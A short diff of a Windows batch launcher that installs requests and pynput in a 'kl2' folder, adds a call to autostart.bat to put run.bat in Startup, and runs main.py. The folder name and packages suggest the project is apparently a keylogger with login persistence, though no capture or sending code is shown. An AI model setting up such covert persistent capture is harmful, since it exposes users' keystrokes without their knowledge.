@@ -6,10 +6,11 @@ cd C:\users\%USERNAME%\kl2
 pip install requests
 pip install pynput
 
-autostart.bat
+:: Run autostart.bat to add run.bat to Startup
+call autostart.bat
 
 echo Running main.py...
-main.py
+python main.py
 if %errorlevel% neq 0 (
     echo Error occurred while running main.py.
     pause
